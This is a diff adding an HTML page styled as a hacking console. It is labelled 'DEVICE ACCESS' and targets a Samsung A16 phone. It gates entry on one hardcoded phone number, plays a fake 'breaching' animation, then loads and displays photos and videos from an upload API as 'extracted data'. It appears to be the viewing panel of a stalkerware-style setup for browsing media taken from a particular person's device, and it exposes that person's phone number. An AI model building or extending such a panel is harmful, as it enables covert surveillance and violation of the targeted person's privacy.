@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DEVICE ACCESS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: #000;
+            color: #00ff00;
+            min-height: 100vh;
+        }
+        .matrix {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 0; opacity: 0.05;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,0,0.03) 2px, rgba(0,255,0,0.03) 4px);
+        }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; position: relative; z-index: 2; }
+        .header {
+            background: #000; border: 2px solid #ff0000; padding: 25px;
+            text-align: center; margin-bottom: 20px;
+            box-shadow: 0 0 30px rgba(255,0,0,0.5);
+        }
+        .header h1 { color: #ff0000; text-shadow: 0 0 10px #ff0000; font-size: 20px; }
+        .header .sub { color: #00ff00; font-size: 11px; margin-top: 10px; animation: blink 1s infinite; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+        .input-box { background: #000; border: 2px solid #00ff00; padding: 20px; margin: 15px 0; }
+        .input-box input {
+            width: 100%; padding: 15px; background: #000; border: 1px solid #00ff00;
+            color: #00ff00; font-size: 18px; text-align: center;
+            font-family: 'Share Tech Mono', monospace; letter-spacing: 3px; outline: none;
+        }
+        .btn {
+            width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ff0000;
+            background: #000; color: #ff0000; font-size: 16px; font-weight: bold;
+            cursor: pointer; font-family: 'Share Tech Mono', monospace; transition: all 0.3s;
+        }
+        .btn:hover { background: #ff0000; color: #000; }
+        .error-msg { background: #000; border: 2px solid #ff0000; padding: 15px; text-align: center; color: #ff0000; margin: 15px 0; display: none; }
+        .gallery { display: none; }
+        .gallery h2 { text-align: center; color: #ffff00; text-shadow: 0 0 10px #ffff00; margin: 15px 0; font-size: 16px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
+        .item { border: 1px solid #00ff00; overflow: hidden; border-radius: 5px; background: #111; cursor: pointer; }
+        .item img, .item video { width: 100%; height: 200px; object-fit: cover; display: block; }
+        .item .cap { padding: 8px; font-size: 9px; color: #00ff00; text-align: center; background: rgba(0,255,0,0.05); }
+        .loading { text-align: center; padding: 30px; display: none; }
+        .loader {
+            border: 3px solid #000; border-top: 3px solid #ff0000; border-radius: 50%;
+            width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .count { text-align: center; color: #888; font-size: 10px; margin: 5px 0; }
+        .section { color: #ff6600; text-align: center; font-size: 13px; margin: 20px 0 10px; border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .preview {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 999;
+            display: none; justify-content: center; align-items: center;
+        }
+        .preview img, .preview video { max-width: 95%; max-height: 95%; }
+        .preview .close {
+            position: absolute; top: 20px; right: 20px;
+            color: #ff0000; font-size: 30px; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix"></div>
+    
+    <div class="container">
+        <div class="header">
+            <h1>☠️ DEVICE ACCESS ☠️</h1>
+            <div class="sub">[ TARGET: SAMSUNG A16 ]</div>
+        </div>
+        
+        <div id="loginForm">
+            <div class="input-box">
+                <div style="color:#888;font-size:10px;text-align:center;margin-bottom:10px;">ENTER TARGET NUMBER</div>
+                <input type="tel" id="phoneInput" placeholder="01XXXXXXXXX" maxlength="11">
+            </div>
+            <button class="btn" onclick="checkNumber()">[ ACCESS DEVICE ]</button>
+            <div class="error-msg" id="errorMsg"></div>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="loader"></div>
+            <p style="color:#ff0000;margin-top:15px;">BREACHING DEVICE...</p>
+        </div>
+        
+        <div class="gallery" id="gallery">
+            <h2>📱 EXTRACTED DATA</h2>
+            <div class="count" id="dataCount"></div>
+            <div class="section">📸 PHOTOS</div>
+            <div class="grid" id="photoGrid"></div>
+            <div class="section">🎬 VIDEOS</div>
+            <div class="grid" id="videoGrid"></div>
+            <button class="btn" onclick="location.reload()" style="margin-top:20px;">[ BACK ]</button>
+        </div>
+    </div>
+    
+    <div class="preview" id="preview" onclick="this.style.display='none'">
+        <span class="close">✕</span>
+        <img id="previewImg" src="" style="display:none;">
+        <video id="previewVideo" src="" controls style="display:none;"></video>
+    </div>
+
+    <script>
+        const TARGET = "01288649304";
+        const API = '/api/upload_file';
+
+        async function checkNumber() {
+            const input = document.getElementById('phoneInput').value.trim();
+            const error = document.getElementById('errorMsg');
+            
+            if (!input) {
+                error.style.display = 'block';
+                error.textContent = '[!] ENTER A NUMBER';
+                return;
+            }
+            
+            if (input !== TARGET) {
+                error.style.display = 'block';
+                error.textContent = '[!] ACCESS DENIED';
+                return;
+            }
+            
+            error.style.display = 'none';
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            await sleep(2000);
+            
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('gallery').style.display = 'block';
+            
+            loadFiles();
+        }
+        
+        async function loadFiles() {
+            try {
+                const res = await fetch(API);
+                const data = await res.json();
+                
+                const files = data.files || [];
+                const photos = files.filter(f => f.pathname.includes('/photos/'));
+                const videos = files.filter(f => f.pathname.includes('/videos/'));
+                
+                document.getElementById('dataCount').textContent = 
+                    `📸 ${photos.length} photos | 🎬 ${videos.length} videos`;
+                
+                document.getElementById('photoGrid').innerHTML = photos.length ? 
+                    photos.map(p => `
+                        <div class="item" onclick="openPreview('${p.url}', 'image')">
+                            <img src="${p.url}" loading="lazy">
+                            <div class="cap">📸 ${p.pathname.split('/').pop().replace(/^\d+_/, '')}</div>
+                        </div>
+                    `).join('') : '<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No photos</div>';
+                
+                document.getElementById('videoGrid').innerHTML = videos.length ?
+                    videos.map(v => `
+                        <div class="item" onclick="openPreview('${v.url}', 'video')">
+                            <video src="${v.url}" preload="metadata"></video>
+                            <div class="cap">🎬 ${v.pathname.split('/').pop().replace(/^\d+_/, '')}</div>
+                        </div>
+                    `).join('') : '<div style="color:#555;text-align:center;padding:20px;grid-column:1/-1;">No videos</div>';
+                    
+            } catch(e) {
+                console.error(e);
+            }
+        }
+        
+        function openPreview(url, type) {
+            const preview = document.getElementById('preview');
+            const img = document.getElementById('previewImg');
+            const video = document.getElementById('previewVideo');
+            
+            img.style.display = 'none';
+            video.style.display = 'none';
+            
+            if (type === 'image') {
+                img.src = url;
+                img.style.display = 'block';
+            } else {
+                video.src = url;
+                video.style.display = 'block';
+            }
+            
+            preview.style.display = 'flex';
+        }
+        
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    </script>
+</body>
+</html>
